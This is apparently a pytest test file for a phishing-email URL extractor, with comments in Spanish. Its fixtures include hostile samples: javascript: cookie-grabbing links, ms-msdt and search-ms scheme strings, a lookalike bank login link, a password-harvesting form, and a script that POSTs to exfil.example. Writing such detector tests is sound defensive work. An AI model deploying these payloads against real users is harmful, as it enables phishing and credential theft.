from __future__ import annotations

import time

import pytest

from centinela.core.models import ExtractedUrl
from centinela.parsing.urls import (
    MAX_URLS,
    dedupe_urls,
    extract_urls_html,
    extract_urls_text,
    normalize_url,
)


def urls(items: list[ExtractedUrl]) -> list[str]:
    return [u.url for u in items]


# --------------------------------------------------------------------------- normalización


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("HTTPS://Evil.EXAMPLE/Path?Q=1", "https://evil.example/Path?Q=1"),
        ("https:\\\\evil.example\\a\\b", "https://evil.example/a/b"),
        ("https:/evil.example/x", "https://evil.example/x"),
        ("https:evil.example/x", "https://evil.example/x"),
        ("//cdn.evil.example/x.js", "https://cdn.evil.example/x.js"),
        ("www.ejemplo.com/pago", "http://www.ejemplo.com/pago"),
        ("  https://ev\nil.exa\tmple/x\r\n ", "https://evil.example/x"),
        ("https://www.banco.com@evil.example/login", "https://www.banco.com@evil.example/login"),
        ("javascript:alert(document.cookie)", "javascript:alert(document.cookie)"),
        ("JaVaScRiPt:void(0)", "javascript:void(0)"),
        (
            "search-ms:query=factura&crumb=location:\\\\1.2.3.4@80\\share",
            "search-ms:query=factura&crumb=location:\\\\1.2.3.4@80\\share",
        ),
        ("ms-msdt:/id PCWDiagnostic /skip force", "ms-msdt:/id PCWDiagnostic /skip force"),
        ("\\\\evil.example@SSL\\DavWWWRoot\\x.exe", "file://evil.example@SSL/DavWWWRoot/x.exe"),
        ("file:///C:/Windows/x.exe", "file:///C:/Windows/x.exe"),
        ("C:\\Users\\Public\\x.exe", "file:///C:/Users/Public/x.exe"),
        ("data:text/html;base64,PGh0bWw+", "data:text/html;base64,PGh0bWw+"),
    ],
)
def test_normalize(raw, expected):
    assert normalize_url(raw) == expected


@pytest.mark.parametrize(
    "raw",
    [
        "mailto:a@b.com",
        "cid:image001.png@01D",
        "tel:+5411",
        "about:blank",
        "#arriba",
        "",
        "   ",
        "pagina.html",
        "/rel/x",
    ],
)
def test_normalize_ignores(raw):
    assert normalize_url(raw) is None


def test_relative_resolved_with_base():
    assert (
        normalize_url("x.php?a=1", base="https://evil.example/kit/") == "https://evil.example/kit/x.php?a=1"
    )


def test_data_url_capped():
    long = "data:application/octet-stream;base64," + "A" * 100_000
    assert len(normalize_url(long)) == 512


# --------------------------------------------------------------------------- texto


def test_text_basic_and_trailing_punctuation():
    text = (
        "Pagá acá: https://pagos.evil.example/factura?id=12345. También (ver https://es.wikipedia.org/wiki/A_(b)) "
        "o entrá a www.ejemplo.com.ar/x, gracias! <https://angulo.example/y>"
    )
    got = urls(extract_urls_text(text, "body_text"))
    assert got == [
        "https://pagos.evil.example/factura?id=12345",
        "https://es.wikipedia.org/wiki/A_(b)",
        "http://www.ejemplo.com.ar/x",
        "https://angulo.example/y",
    ]


def test_text_dangerous_windows_schemes_kept():
    text = (
        "abrí search-ms:query=pago&crumb=location:\\\\203.0.113.5@80\\docs y también "
        "ms-msdt:/id PCWDiagnostic o ms-word:ofe|u|https://evil.example/doc.docx y file://203.0.113.5/s/x.exe"
    )
    got = urls(extract_urls_text(text))
    assert any(u.startswith("search-ms:") for u in got)
    assert any(u.startswith("ms-msdt:") for u in got)
    assert any(u.startswith("ms-word:ofe|u|https://evil.example") for u in got)
    assert "file://203.0.113.5/s/x.exe" in got


def test_text_ignores_mailto_and_emails_and_plain_words():
    text = "Escribime a juan@www.proveedor.com o mailto:juan@x.com. Buscar: algo. Las ms-dos eran lindas."
    assert extract_urls_text(text) == []


def test_text_dedupe_and_source():
    got = extract_urls_text("https://a.example/x https://A.EXAMPLE/x https://a.example/x", "artifact:att1")
    assert urls(got) == ["https://a.example/x"]
    assert got[0].source == "artifact:att1"
    assert got[0].display_text is None


def test_text_cap_at_1000():
    text = " ".join(f"https://h{i}.example/p" for i in range(3000))
    got = extract_urls_text(text)
    assert len(got) == MAX_URLS


def test_text_no_catastrophic_backtracking():
    hostile = "www." + "a." * 50_000 + "!" + "https://" + "x" * 100_000 + " " + ("(" * 10_000)
    t0 = time.perf_counter()
    extract_urls_text(hostile)
    assert time.perf_counter() - t0 < 5


# --------------------------------------------------------------------------- HTML


def test_html_anchor_mismatch_keeps_display_text():
    html = '<p>Ingresá a <a href="https://mercadopag0-login.example/ingresar">https://www.mercadopago.com.ar</a></p>'
    got = extract_urls_html(html, "body_html")
    assert len(got) == 1
    assert got[0].url == "https://mercadopag0-login.example/ingresar"
    assert got[0].display_text == "https://www.mercadopago.com.ar"
    assert got[0].source == "body_html"


def test_html_all_link_kinds():
    html = """
    <html><head>
      <meta http-equiv="refresh" content="0; URL='https://redir.example/a'">
      <link rel="stylesheet" href="https://css.example/s.css">
      <script src="https://js.example/kit.js"></script>
    </head><body background="https://bg.example/b.png">
      <form action="https://harvest.example/post.php" method="post"><input name="pass" type="password">
        <button formaction="https://harvest2.example/p">OK</button></form>
      <iframe src="https://frame.example/f"></iframe>
      <img src="https://track.example/pixel.gif">
      <map><area href="https://area.example/a"></map>
      <object data="https://obj.example/o.swf"></object>
      <embed src="https://embed.example/e">
      <a href="javascript:location='https://js-redirect.example'">click</a>
      <a href="data:text/html;base64,PHNjcmlwdD4=">ver factura</a>
      <a href="mailto:x@y.com">mail</a> <img src="cid:image001.png">
      <svg><a xlink:href="https://svg.example/x"><text>t</text></a></svg>
      Texto con URL suelta https://loose.example/z.
    </body></html>
    """
    got = urls(extract_urls_html(html))
    for expected in [
        "https://redir.example/a",
        "https://css.example/s.css",
        "https://js.example/kit.js",
        "https://bg.example/b.png",
        "https://harvest.example/post.php",
        "https://harvest2.example/p",
        "https://frame.example/f",
        "https://track.example/pixel.gif",
        "https://area.example/a",
        "https://obj.example/o.swf",
        "https://embed.example/e",
        "javascript:location='https://js-redirect.example'",
        "data:text/html;base64,PHNjcmlwdD4=",
        "https://svg.example/x",
        "https://loose.example/z",
    ]:
        assert expected in got, expected
    assert not any(u.startswith(("mailto:", "cid:")) for u in got)


def test_html_entities_newlines_and_base():
    html = (
        '<base href="https://kit.evil.example/dir/">'
        '<a href="h&#116;tps://ent.example/?a=1&amp;b=2">x</a>'
        '<a href="https://split.\nexample/\tlogin">y</a>'
        '<a href="relativo.php">z</a>'
    )
    got = urls(extract_urls_html(html))
    assert "https://ent.example/?a=1&b=2" in got
    assert "https://split.example/login" in got
    assert "https://kit.evil.example/dir/relativo.php" in got


def test_html_raster_data_images_skipped_but_svg_data_kept():
    html = (
        '<img src="data:image/png;base64,iVBORw0KGgo=">'
        '<img src="data:image/svg+xml;base64,PHN2Zz4=">'
        '<a href="data:image/png;base64,AAAA">x</a>'
    )
    got = urls(extract_urls_html(html))
    assert "data:image/png;base64,iVBORw0KGgo=" not in got
    assert "data:image/svg+xml;base64,PHN2Zz4=" in got
    assert "data:image/png;base64,AAAA" in got  # un link (no imagen) a data: sí importa


def test_html_outlook_vml_button_in_conditional_comment():
    html = """<!--[if mso]><v:roundrect href="https://vml.evil.example/x" style="width:200px">
    <center>Ver documento</center></v:roundrect><![endif]--><a href="https://ok.example">ok</a>"""
    got = urls(extract_urls_html(html))
    assert "https://vml.evil.example/x" in got


def test_html_script_urls_extracted():
    html = "<script>fetch('https://exfil.example/gate.php', {method:'POST'}); var u = \"https://next.example/2\";</script>"
    got = urls(extract_urls_html(html))
    assert "https://exfil.example/gate.php" in got
    assert "https://next.example/2" in got


def test_html_duplicate_attribute_first_wins_like_browsers():
    got = extract_urls_html('<a href="https://first.example" href="https://second.example">x</a>')
    assert urls(got) == ["https://first.example"]


def test_html_nested_and_unclosed_anchors():
    html = '<a href="https://one.example">uno <a href="https://two.example">dos</a> <a href="https://three.example">tres'
    got = {u.url: u.display_text for u in extract_urls_html(html)}
    assert got["https://one.example"] == "uno"
    assert got["https://two.example"] == "dos"
    assert got["https://three.example"] == "tres"


def test_html_same_url_different_display_texts_kept():
    html = '<a href="https://x.example">Banco</a><a href="https://x.example">Banco</a><a href="https://x.example">AFIP</a>'
    got = extract_urls_html(html)
    assert [(u.url, u.display_text) for u in got] == [
        ("https://x.example", "Banco"),
        ("https://x.example", "AFIP"),
    ]


def test_html_benign_has_no_spurious_urls():
    html = "<html><body><p>Hola Ana, confirmo la reunión del jueves.</p><p>Saludos</p></body></html>"
    assert extract_urls_html(html) == []


@pytest.mark.parametrize(
    "html",
    [
        "<a href=",
        "<<<<>>>>",
        "<a href='https://x.example'" + "<" * 10_000,
        "<!" + "-" * 50_000,
        "<![CDATA[" + "x" * 1000,
        '<html><body><a href="' + "A" * 200_000 + '">x</a>',
        "\x00\x01\x02<a href=https://nul.example>\x00</a>",
        "<script>" + "<!--" * 1000,
    ],
    ids=[
        "open-attr",
        "brackets",
        "many-lt",
        "comment-dashes",
        "cdata",
        "huge-attr",
        "nul",
        "script-comments",
    ],
)
def test_html_hostile_never_raises(html):
    got = extract_urls_html(html)
    assert isinstance(got, list)
    assert all(len(u.url) <= 2048 for u in got)


def test_html_cap_at_1000():
    html = "".join(f'<a href="https://h{i}.example/">l{i}</a>' for i in range(2500))
    assert len(extract_urls_html(html)) == MAX_URLS


def test_dedupe_urls_helper():
    items = [
        ExtractedUrl(url="https://a", source="body_text"),
        ExtractedUrl(url="https://a", source="body_text"),
        ExtractedUrl(url="https://a", source="body_html", display_text="A"),
        ExtractedUrl(url="https://a", source="artifact:att0"),
    ]
    assert len(dedupe_urls(items)) == 3
    assert len(dedupe_urls(items, cap=2)) == 2
